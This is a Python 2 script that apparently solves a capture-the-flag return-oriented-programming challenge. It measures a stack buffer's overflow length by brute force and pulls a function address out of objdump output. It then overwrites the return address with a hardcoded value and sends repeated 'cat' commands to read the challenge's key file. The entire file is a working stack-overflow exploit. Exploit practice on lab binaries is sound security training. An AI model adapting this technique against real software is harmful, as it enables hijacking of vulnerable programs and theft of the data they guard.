import sys
import subprocess

itr = 0
payload = ""
ret_to = raw_input("Enter function label to return to (CASE_SENSITIVE): ")
ret_to = "<" + str(ret_to).strip() + ">"

#print "CALCULATING PAYLOAD LENGTH"
while True:
	test = subprocess.Popen("./a.out", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
	ans = test.communicate(payload)
	#print ans
	if ans[0] == "":
		break;
	else:
		itr += 1
		payload = "A" * itr

#print itr - 1
payload = "A" * (itr - 1)
test = subprocess.Popen(["objdump","-d", "/problems/ROP_1_fa6168f4d8eba0eb/rop1"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
out = test.stdout.readlines()
adr = ""
for line in out:
	if ret_to in line:
		adr = line
		break

#print line
adr = adr[:adr.index(ret_to)-1]
if len(adr)%2 != 0:
	adr = "0" + adr

#print "ADDR: 0x" + adr

adr = [adr[i:i+2] for i in range(0, len(adr), 2)]

if sys.byteorder == 'little':
	adr.reverse()

#print "ADDR with " + sys.byteorder + " endieness: " + str(adr)

i = 0

while i < len(adr):
	adr[i] = chr(int(adr[i], 16))
	i += 1


adr = "".join(adr)
#print "NEW PAYLOAD:"
#payload = payload + adr
payload = payload + "\xa4\x84\x04\x08"
print payload
#print ""
#print "TESTING"
#print "" 
test = subprocess.Popen("/problems/ROP_1_fa6168f4d8eba0eb/rop1", stdin=subprocess.PIPE)
test.stdin.write(payload+"\n")
while True:
	test.stdin.write("cat /problems/ROP_1_fa6168f4d8eba0eb/key\n") 
